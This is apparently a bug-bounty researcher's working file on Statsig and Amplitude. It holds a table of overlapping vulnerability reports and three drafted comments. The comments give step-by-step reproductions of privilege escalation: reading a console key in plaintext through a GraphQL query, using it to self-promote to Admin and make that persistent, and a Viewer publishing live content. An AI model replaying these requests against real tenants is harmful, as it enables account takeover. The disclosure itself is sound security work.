# Root-cause overlap review + comments to post on the already-filed reports

## The four reports already filed

| ID | Title | Root cause |
|---|---|---|
| `f354f04c` | mcp.amplitude.com OAuth token theft | Anonymous DCR accepts an arbitrary `redirect_uri`; consent shows no scopes |
| `e103ef0a` | Statsig — Member reads full plaintext Server Secret Key | The `SDKKey.value` resolver has **no masking predicate for the Member role** (a predicate exists for Read Only) — a **read**-side defect |
| `8d4a107f` | Statsig — Member bypasses the disabled CAPI setting | Part 1: the `create_sdkkey` resolver does **not enforce `personalCAPIKeyAccess`** — a **create**-side defect. Part 2: the Console **API** path lacks the role-scoped **read** predicate the console session has |
| `c1f935a8` | Amplitude Developer API — Viewer writes taxonomy and flags | The Developer API never evaluates RBAC; it authorizes on the **OAuth scope string** alone |

## The eight reports in this run

All eight have been audited claim-by-claim (three by their own authors, five by independent auditors)
and corrected. **Sizes and scores below are post-correction.**

> ⚠️ **SUPERSEDED-IN-PART 2026-10-17 (full retest).** This table reflects the September state. Per the
> 2026-10-17 retest (see `../retest/RETEST-REPORT.md` and `../retest/CROSS-REPORT-CONSISTENCY-AUDIT.md`):
> **#4 INGESTION-SSRF and #5 GS-AUTHZ are VENDOR-FIXED → DO NOT FILE; #7 XLIFF downgraded to ~4.3 Low
> (residual only); #2 REVIEW-BYPASS expanded to 5/5 commit routes (see its §11 addendum); two NEW reports
> exist outside this table (SUBMISSION-MCP-VIEWER-ALLWRITE 7.6, SUBMISSION-PUSHER-CROSSTENANT-CHANNELS 4.3)
> plus REPLY-e103ef0a for the filed e103ef0a.** The pairwise root-cause analysis below remains valid for
> the surviving reports; the current filing pack is defined by the retest report.

| # | Report | Size | CVSS | Root cause | Overlap? |
|---|---|---|---|---|---|
| 1 | `SUBMISSION-STATSIG-MEMBER-TO-ADMIN.md` | 23.4 KB | **8.8** | The **REST console API authorizes by KEY CLASS, not by the caller's role** — a company-scoped key is admin-equivalent regardless of the human behind it. Enabled by the missing admin check on `UpdateSDKKeyScopes`/`DeactivateSDKKey` | **Adjacent** to `8d4a107f` — same object family (SDK keys), **different resolver and different defect**; the REST key-class defect is new |
| 2 | `SUBMISSION-STATSIG-REVIEW-BYPASS.md` | 49.6 KB | 6.5 | `commit` is the one verb in the review family that does not resolve an acting user, so a company-scoped key commits an **unapproved** review and the change goes live | **Distinct from #1**: #1 is a role decision on the management surface, this is a missing acting-user resolution on one review verb. Shares only the credential-acquisition **precondition** |
| 3 | `SUBMISSION-TAXONOMY-SHIM.md` | 26.6 KB | **7.1** | `/o/taxonomy-api-shim/*` derives `readOnly` from **app membership** instead of `CanEditTaxonomy`, so a Viewer edits and deletes the tracking plan | Same *class* as #5 and as `c1f935a8` — **different route prefix, object and fix**; duplicate-risk paragraph present in both directions |
| 4 | `SUBMISSION-STATSIG-INGESTION-SSRF.md` | 26.5 KB | **4.6** | Caller-directed outbound fetch, no address filter, redirect hops unpoliced; **blind** — reachability and topology oracle only | Different vendor and product from #8; **opposite egress origins** |
| 5 | `SUBMISSION-GS-AUTHZ.md` | 20.9 KB | **6.5** | `app.amplitude.com/a/` + `/h/` REST viewsets are missing a role check on specific viewsets (Viewer gets 201 on some, 403 on siblings in the same session) | **Different asset and mechanism** from `c1f935a8` (OAuth developer API vs internal DRF viewsets). Same *class*, which is why a comment is prepared |
| 6 | `SUBMISSION-AGENT-IDOR.md` | 16.3 KB | 7.1 | **Seven** agent-runtime resolvers check `exists(object)` where they should check `owns(caller, object)` | **New surface, new defect — no overlap** |
| 7 | `SUBMISSION-XLIFF-DOS.md` | 10.2 KB | 6.5 | The XLIFF parser is Python `ElementTree` (not `defusedxml`) with no entity-expansion limit | **No overlap** — same backend as #5, different defect |
| 8 | `SUBMISSION-RC-SSRF.md` | 11.4 KB | **2.9** | A tenant-supplied `website` source is fetched server-side with no allow-list. **Blind, proxied, title-only** — not a body read | Different vendor and product from #4 |

**Summary:** five findings are on ground no filed report touches. Three sit in the same *class* as a
filed report, so a comment is prepared for each — to raise the impact on the existing report rather
than file a near-duplicate.

### Corrections that changed the picture (post-audit)

```
UPGRADED  #5 GS-AUTHZ  — its ceiling said SDK delivery to end users was an "open proof gap". It was
                         FALSE: the escalation reproduces end to end (13,330 B -> 14,760 B carrying
                         the Viewer's marker -> 13,330 B after deletion). A proven end-user impact was
                         being thrown away.
DOWN      #4 SSRF      7.2 -> 4.6   — `C:H` unsupported; nothing was ever read. Reachability and the
                         two oracles are proven, content read is not.
DOWN      #8 RC-SSRF   4.3 -> 2.9   — its headline "full-response-read" claim was FALSE: the read
                         endpoints return metadata only (`content_markdown: null`).
DOWN      #5 GS-AUTHZ  7.1 -> 6.5   — arithmetic: the published vector recomputes to 6.5 (7.1 is the
                         `A:L` variant).
SAME      #6 7.1, #7 6.5, #1 8.8, #2 6.5 — all recomputed independently and confirmed.
NOTE      the internal network map in #4 is a SNAPSHOT: on re-measurement `.2`/`.3` time out and
          `.10` — previously listed as silent — is the one that answers. Addresses rotate.
```

**The `SUBMISSION-STATSIG-KEYESC.md` file no longer exists as a separate report** — it carries a
SUPERSEDED banner and was folded into `SUBMISSION-STATSIG-MEMBER-TO-ADMIN.md` (#1), which is the same
finding written as a standalone chain.

---
---

# COMMENT 1 — to post on `8d4a107f` (Statsig — Member bypasses disabled CAPI setting)

> **UPDATE — the impact of this finding is higher than the report states, and the escalation does
> not require the step you might expect.**
>
> This report shows a Member can obtain a management credential the administrator-facing setting was
> meant to prevent. Since filing I have established where that credential class actually leads, and
> the result changes the severity: a Member reaches the **Admin** role.
>
> **The deciding input is the key's CLASS, not its scopes.**
>
> ```
> # a COMPANY-SCOPED key (owner: null) with nothing but its ordinary scope:
> GET  /console/v1/users                                            -> 200
> GET  /console/v1/company                                          -> 200
> GET  /console/v1/audit_logs                                       -> 200
> POST /console/v1/settings/roles {"default_project_role":"Admin"}   -> 201
> POST /console/v1/users/<anyone> {"role":"Admin"}                   -> 201
> GET  /console/v1/keys                                             -> 403
> POST /console/v1/keys                                             -> 403
>
> # the SAME calls with a PERSONAL key (owner set, the class Part 1 produces):
> GET  /console/v1/users                                            -> 200
> POST /console/v1/settings/roles                                   -> 400 "Must be admin of project"
> POST /console/v1/users/<anyone> {"role":"Admin"}                   -> 400 "Must be admin of project or project org"
> ```
>
> **The deciding input is the key's CLASS; the key's SCOPE must also permit writes.** A
> company-scoped key that already carries `omni_read_write` — the ordinary case, and the one measured
> above — is used exactly as it is returned and nothing about it is modified. A company-scoped key
> issued read-only is refused, and the Member raises its scope first; that raise is itself ungated,
> so the chain works from a read-only key too. Measured on **one key value with only the scope
> differing**:
>
> ```
> company-scoped key, scopes ["omni_read_only"]
>   POST /console/v1/users/<self> {"role":"Admin"}   -> 401 "Read only API keys can not modify entities"
>   POST /console/v1/settings/roles                  -> 401 "Read only API keys can not modify entities"
>   GET  /console/v1/keys                            -> 403 "Insufficient permissions."
>
> the Member rewrites that same key's scopes through the ungated GraphQL mutation
>   UpdateSDKKeyScopes -> 200   (key VALUE unchanged, read back ["omni_read_write"])
>
> the same requests on the same key value, now
>   POST /console/v1/users/<self> {"role":"Admin"}   -> 201 "User updated successfully."
>   GET  /console/v1/users                           -> 200  "role":"admin"
> ```
>
> So the scope is decisive — but it is not a barrier, because the operation that rewrites it
> (`UpdateSDKKeyScopes`, and likewise `DeactivateSDKKey`) carries **no admin gate**: a plain Member
> issues it successfully and the audit trail attributes the change to that Member. Neither
> `CreateSDKKey` nor `DeleteSDKKey` behaves this way — both answer `"Must be admin of project"` for
> the same caller. A Member who can obtain the *value* of any company-scoped key in the project
> therefore promotes themselves to Admin with it:
>
> ```
> GET  /console/v1/users                                  STATSIG-API-KEY: <company-scoped key>
> -> 200   ... "email":"<member>","role":"member" ...
>
> POST /console/v1/users/<member's own email>             STATSIG-API-KEY: <same key>
> {"role":"Admin"}
> -> 201   {"message":"User updated successfully."}
>
> GET  /console/v1/users                                  STATSIG-API-KEY: <same key>
> -> 200   ... "role":"admin"        <- the Member is now an Admin
> ```
>
> And the persistence step:
> ```
> POST /console/v1/settings/roles {"default_project_role":"Admin"} -> 201
>    (every future invitee to the project lands as an Admin)
> ```
>
> **Where the value comes from is the other filed report** — `e103ef0a` establishes that a plain
> Member can read company-scoped key values in plaintext through the key-box query
> (`d6fcaacbc921668f7e7aa576b9d2ca1e`). So the two reports are the two halves of one chain:
> **read a company-scoped key → use it → Admin.**
>
> **Why this is not simply Part 1 repeated.** The key Part 1 produces is **personal**
> (`owner_id` set), and a personal key is capped at `400` on every write — proven:
>
> ```
> POST /console/v1/keys   STATSIG-API-KEY: <personal key>   {"owner_id":null,…}
> -> 403 "Insufficient permissions."              (three body shapes tested)
> POST /console/v1/users/<self> {"role":"Admin"}  STATSIG-API-KEY: <personal key>
> -> 400 "Must be admin of project or project org"
> UpdateSDKKeyScopes {"id":"<personal key>","scopes":["omni_read_write","can_access_keys"]}
> -> {"errors":[{"message":"Scopes: Invalid scopes: omni_read_write, can_access_keys"}]}
>    read-back: scopes unchanged
> ```
>
> So Part 1's credential reads the audit trail and the roster (Part 2) but cannot escalate. The
> escalation needs a company-scoped key — which the read gap in `e103ef0a` supplies.
>
> **What is still worth fixing here, and why your Part 1 matters.** Your finding is what shows the
> console's administrator-facing gate (`personalCAPIKeyAccess`) is not enforced server-side. That
> gate is the *only* thing standing between a Member and a personal credential, and the personal
> credential is the first link of the read chain above.
>
> **Durability and attribution:** a company-scoped key kept performing admin role changes (`201`)
> after its owner was demoted to Member, and the audit trail records
> `"by": "CONSOLE API - console-…"` rather than a person.
>
> **Recommended remediation:** authorize on the **caller's role**, not the key class, at every
> `/console/v1` route; extend the existing Read-Only masking predicate to role < Admin so the key
> value cannot be read (this is `e103ef0a`); and enforce `personalCAPIKeyAccess` server-side in the
> create resolver (this report). If these are treated as one issue, the severity should be assessed
> against the **Admin-takeover** ceiling.
>
> All steps were performed on my own tenants, reverted, and verified: the account is back to
> `Member`, the minted keys were deleted, and the console key list is at its baseline.

---

---

# COMMENT 2 — to post on `c1f935a8` (Amplitude Developer API — Viewer writes taxonomy and flags)

> **UPDATE — the same class of defect exists on a second, unrelated surface, and there the Viewer
> can reach the customer's production content.**
>
> The Developer API finding is that RBAC is never evaluated and authorization is decided by the
> OAuth scope string. While retesting I found the same *class* of failure — a role check that is
> present on some operations and absent on their siblings — on an entirely different surface:
> Amplitude's internal Guides & Surveys / Houston REST API (`app.amplitude.com/a/`, `/h/`), which
> does not use the Developer API's OAuth layer at all.
>
> The diagnostic is a within-session contradiction: **the same Viewer session is accepted on some
> viewsets and refused on their siblings.**
>
> ```
> session: orgRole = 1 (Viewer)          org 464637 / app 862908
>
> POST   /a/guides-surveys/     -> 201   POST   /a/tags/        -> 403
> POST   /a/themes/             -> 201   POST   /a/templates/   -> 403
> POST   /a/collections/        -> 201   POST   /a/app/         -> 403
> DELETE /a/collections/<id>/   -> 204   PATCH  /a/resource-center/112251/ -> 403
> POST   /h/syncs/              -> 200   POST   /h/sources/     -> 403
> ```
>
> Because the refusal happens on some routes in the same session, this cannot be "the Viewer is
> meant to have this". It is a permission class that was not applied uniformly.
>
> **The reach is further than the Developer API report's ceiling, in one respect: the Viewer can
> publish.**
>
> ```
> # body field is ignored for everyone, including the Admin:
> PATCH /a/guides-surveys/<id>/?org_id=…&app_id=…   {"flagConfig":{"enabled":true}}
> -> 200, enabled stays false
>
> # the publish is driven by a query parameter, and a Viewer can send it:
> PATCH /a/guides-surveys/<id>/?org_id=…&app_id=…&unpublished_changes=True&publish=true
>       {"id":<id>, "flag_config":{...,"enabled":true}, ...}
> -> 200   {"flagConfig":{...,"enabled":true}}      <- a read-only user published live content
>
> GET   /a/guides-surveys/<id>/   (same Viewer)  -> 200, enabled = true
>
> # and it cannot be undone by them:
> DELETE /a/guides-surveys/<id>/  (Viewer) -> 403        (Admin -> 204)
> ```
>
> The check exists on create and is missing on update: `POST /a/guides-surveys/?…&publish=true`
> returns `403` for the Viewer, while the same parameters on `PATCH` return `200`. A read-only
> account has therefore performed an irreversible change to the organization's production
> configuration, and cannot retract it.
>
> **Relationship to this report.** These are two independent authorization defects on two different
> services with two different mechanisms — this report's is an OAuth-scope-vs-RBAC failure in the
> Developer API; the new one is a missing DRF permission class on the internal G&S/Houston viewsets.
> They share a class, not a code path. I have filed the second separately with full reproduction;
> posting it here as well because the *root* pattern — Amplitude's RBAC not being applied uniformly
> across the surfaces that consume it — is the same, and it is the reason to treat both as one
> systemic problem rather than two isolated bugs.
>
> All objects created during testing were deleted and every collection verified back to baseline.

---
---

# COMMENT 3 — to post on `e103ef0a` (Statsig — plaintext Server Secret Key)

> UPDATE — the leaked value is an Admin-takeover credential, not only a disclosure. Full reproduction below.
>
> Since filing I re-ran this end to end and traced what the exposed value actually does against the
> management API. The result changes the severity of this report: the credential this query hands a
> plain Member is **admin-equivalent**, and a Member who reads one becomes an **Admin** of the
> project. The key's scope must permit writes: the key this report exposes already carries
> `omni_read_write` and is used exactly as it is returned. A company-scoped key issued read-only is
> refused (`401 "Read only API keys can not modify entities"`) until its scope is raised — and that
> raise is itself ungated, so the chain also works from a `["omni_read_only"]` key. Measured on one
> key value with only the scope differing: read-only -> `401`; the same value after the Member's
> `UpdateSDKKeyScopes` -> `201 "User updated successfully."`
>
> Root cause of the escalation (a second, independent defect): `https://statsigapi.net/console/v1`
> resolves what a caller may do from the **class of the key presented** (`owner: null` =
> company-scoped), not from the **role of the human behind it**. A company-scoped key is therefore
> treated as admin-equivalent regardless of its owner's role. Its *scope* still gates the write
> (`["omni_read_only"]` is refused with `401 "Read only API keys can not modify entities"`), but the
> Member rewrites the scope itself through the ungated `UpdateSDKKeyScopes` — so the boundary that
> fails is the **class** check, and the scope is not a barrier. This
> report supplies the key; that defect supplies the privilege.
>
> ================================================================================
> REPRODUCTION — complete, self-owned tenant 4n6HCY59mDqwX1iSZQtNvx
> ================================================================================
>
> Setup: two self-owned accounts.
>   Owner  = mohamed-9499-2@agentmail.to
>   Member = mohamed-9499-3@agentmail.to   (role: Member)
> The Owner generates one ordinary CONSOLE key from the console's own API-keys page, which produces a
> company-scoped key (`owner: null`, scopes `["omni_read_write"]`). This is the normal state of any
> project where an administrator has ever created a key — and is the same object already recorded in
> this report (`id=73BExoOXZiCyDNKTkSPZTN CONSOLE scopes=["omni_read_write"] owner=null`).
>
> --------------------------------------------------------------------------------
> STEP 1 — the Member reads the company-scoped key's plaintext value
> --------------------------------------------------------------------------------
> This is the defect already reported here (the masking predicate is wired only for Read Only).
>
>   POST /api/graphql?company_id=4n6HCY59mDqwX1iSZQtNvx
>   Cookie: <Member session>          x-csrf-token: 1
>   Content-Type: application/json
>
>   {"id":"d6fcaacbc921668f7e7aa576b9d2ca1e",
>    "variables":{"first":100,"keyType":"ALL"}}
>
>   -> HTTP 200
>      data.viewer_company.keys_connection.nodes[] =
>        { "id":"7mMPVXztWPzOhabMDvBZvo", "type":"CONSOLE", "owner":null,
>          "scopes":["omni_read_write"], "value":"console-…" }      <- PLAINTEXT, company-scoped
>        { "id":"4n6Qh7ZAZ2FVwTf0W1WJyL", "type":"CLIENT", "owner":null, "value":"client-…" }
>        { "id":"4n6Qh4Fw4smWU499JM5sWH", "type":"SERVER", "owner":null, "value":"secret-…" }
>
> Note `owner: null` — that is the marker for the company-scoped class, and it is the class the
> management API treats as admin.
>
> --------------------------------------------------------------------------------
> STEP 2 — the Member uses that value to promote itself to Admin (no key modification)
> --------------------------------------------------------------------------------
> The key is used exactly as returned. Nothing about it is changed first.
>
>   GET https://statsigapi.net/console/v1/users
>   STATSIG-API-KEY: console-…            (the value from Step 1)
>   -> HTTP 200   ... "email":"mohamed-9499-3@agentmail.to","role":"member" ...
>
>   POST https://statsigapi.net/console/v1/users/mohamed-9499-3@agentmail.to
>   STATSIG-API-KEY: console-…
>   Content-Type: application/json
>   {"role":"Admin"}
>   -> HTTP 201   {"message":"User updated successfully.",
>                  "data":{"userID":"13B13WHITpDKkMpbi22BGW",
>                          "email":"mohamed-9499-3@agentmail.to", …}}
>
>   GET https://statsigapi.net/console/v1/users
>   STATSIG-API-KEY: console-…
>   -> HTTP 200   ... "email":"mohamed-9499-3@agentmail.to","role":"admin" ...
>
> The Member now holds the Admin role. It can promote or demote every other member of the project.
>
> --------------------------------------------------------------------------------
> STEP 3 — the escalation is made persistent
> --------------------------------------------------------------------------------
>   POST https://statsigapi.net/console/v1/settings/roles
>   STATSIG-API-KEY: console-…
>   {"default_project_role":"Admin"}
>   -> HTTP 201   {"message":"Settings updated successfully.",
>                  "data":{"default_project_role":"Admin"}}
>
> Every future invitee to the project now lands as an Admin, so the escalation survives the removal
> of the account that performed it.
>
> --------------------------------------------------------------------------------
> STEP 4 — ceiling (stated honestly, to bound the impact)
> --------------------------------------------------------------------------------
> The promoted Admin cannot touch the original Owner:
>
>   POST /console/v1/users/<owner> {"role":"Member"}      -> 201 returned, role UNCHANGED (no-op)
>   POST /console/v1/users/<owner> {"role":"Read Only"}   -> 201 returned, role UNCHANGED
>   POST /console/v1/users/<self>  {"role":"Owner"}       -> 401 "Must be owner of project"
>   DELETE /console/v1/users/<owner>                      -> 404 (no such route)
>   POST /console/v1/keys/<owner key>/deactivate          -> 404 (no such route)
>   DELETE /console/v1/keys/<owner key>                   -> 403 "Insufficient permissions."
>
> So the ceiling is full Admin authority over every other member, over project settings and over the
> administrative record — not ownership of the project.
>
> Side note worth fixing: the two refused role changes in Step 4 still returned `201` and wrote
> audit-log entries ("Updated … roles to Read Only" / "… to Member") although the role never changed.
> The trail records actions that did not take effect.
>
> ================================================================================
> CONTROLS — this is specific to the company-scoped key class
> ================================================================================
>
> (a) The same calls with a PERSONAL key (the class the console UI hands out — `owner` set):
>
>   POST /console/v1/settings/roles              -> 400 "Must be admin of project"
>   POST /console/v1/users/<member> {"role":"Admin"}
>                                                -> 400 "Must be admin of project or project org"
>   POST /console/v1/keys                        -> 403 "Insufficient permissions."
>
> (b) A personal key cannot be escalated into a company-scoped one either:
>
>   UpdateSDKKeyScopes {"id":"<personal key>",
>                       "scopes":["omni_read_write","can_access_keys"]}
>   -> {"errors":[{"message":"Scopes: Invalid scopes: omni_read_write, can_access_keys"}]}
>      read-back: scopes unchanged, still ["personal_read_write"]
>
>   useCreateSDKKeyMutation {"scopes":["omni_read_write"],"owner_id":null}
>   -> {"errors":[{"message":"Must be admin of project"}]}
>
> (c) The capability matrix, same project, same session, only the key class differs:
>
>   Call with a company-scoped key, scopes=["omni_read_write"], owner=null
>     GET  /console/v1/users                                             -> 200
>     GET  /console/v1/company                                           -> 200
>     GET  /console/v1/audit_logs                                        -> 200
>     POST /console/v1/settings/roles {"default_project_role":"Admin"}    -> 201
>     POST /console/v1/users/<anyone> {"role":"Admin"}                    -> 201
>     GET  /console/v1/keys                                              -> 403
>     POST /console/v1/keys                                              -> 403
>
>   The same calls with a personal key (owner set, scopes=["personal_read_write"])
>     GET  /console/v1/users                                             -> 200
>     GET  /console/v1/company                                           -> 200
>     GET  /console/v1/audit_logs                                        -> 200
>     POST /console/v1/settings/roles                                    -> 400
>     POST /console/v1/users/<anyone> {"role":"Admin"}                    -> 400
>     GET  /console/v1/keys                                              -> 403
>     POST /console/v1/keys                                              -> 403
>
> The only difference between the two columns is the key's class. Note also that the admin surface is
> reachable with a key that carries no admin scope whatsoever — `omni_read_write` alone is enough.
>
> ================================================================================
> WHICH KEY TIER CARRIES THE ESCALATION — and the key-type gate that is missing a role gate
> ================================================================================
>
> The query in Step 1 returns all three tiers to the Member. Only the CONSOLE tier reaches the
> management API — Statsig does enforce a key-TYPE gate, so this is specifically the CONSOLE key
> that a Member should never have been able to read:
>
>   CONSOLE key (owner=null, scopes=["omni_read_write"])   -> the escalation above works
>   CLIENT  key (owner=null, scopes=[])                    -> 403 "This endpoint only accepts an
>                                                             active CONSOLE key, but a CLIENT key
>                                                             was sent."
>   SERVER  key (owner=null, scopes=[])                    -> 403 "This endpoint only accepts an
>                                                             active CONSOLE key, but a SERVER key
>                                                             was sent."
>
> That is the sharpest way to state the defect: **the key-type gate is present and working, and the
> role gate is absent.** The API knows how to reject a key for being the wrong kind; it does not
> reject it for belonging to the wrong person. A company-scoped CONSOLE key is accepted from a plain
> Member with no admin role.
>
> For completeness, the SERVER key still does what the original report documents on its own plane
> (api.statsig.com), which is why this report's own impact stands unchanged:
>
>   GET  https://api.statsig.com/v1/download_config_specs/<SERVER KEY>.json
>   -> 200   (the project's full definition, including server-side targeting rules)
>   POST https://api.statsig.com/v1/check_gate   {"user":{"userID":"someone-else@example.com"},
>                                                 "gateName":"a_visible_gate"}
>   -> 200   {"name":"a_visible_gate","value":false,"rule_id":null}
>            (server-side evaluation for an arbitrary identity)
>
> So the two tiers are exploitable in different places: the SERVER key on the data plane, the CONSOLE
> key on the management plane — and the Member obtains both from the same query.
>
> ================================================================================
> WHAT THIS CHANGES FOR THIS REPORT
> ================================================================================
>
> The original report framed the leak as disclosure of the project's server identity; the 17 Sep
> update extended it to the management identity and demonstrated reads plus a gates write. This update
> adds the part that determines the severity: the value this resolver leaks is an **Admin-takeover
> credential**. A plain Member who reads one company-scoped key through the query above ends up
> holding the project's highest effective role.
>
> It is a separate defect from the missing masking predicate, and the two need separate fixes —
> applying this report's own remediation (mask `SDKKey.value` for roles below Admin) removes the read
> but leaves the class-based authorization untouched, because a company-scoped key is still
> admin-equivalent to anyone who obtains one by any other route. Conversely, fixing the authorization
> leaves the disclosure. Filed separately with the same reproduction.
>
> Remediation for this half is unchanged and still correct: extend the existing Read-Only masking
> predicate to role < Admin at the `SDKKey.value` resolver, and apply the same predicate to the
> sibling persisted operations (`ApiKeysBoxQuery` d6fcaacb…, `PersonalCAPITokenSectionQuery`
> 0799d4b7…), so a Member cannot read the value at all. For the authorization half: `/console/v1`
> should evaluate the caller's role, not the key's class.
>
> All steps were performed on my own tenants. Everything was reverted and verified: the account is
> back to `Member`, the default role restored, the minted keys deleted, and the console key list is at
> its baseline. No destructive call was made against any real project.
>
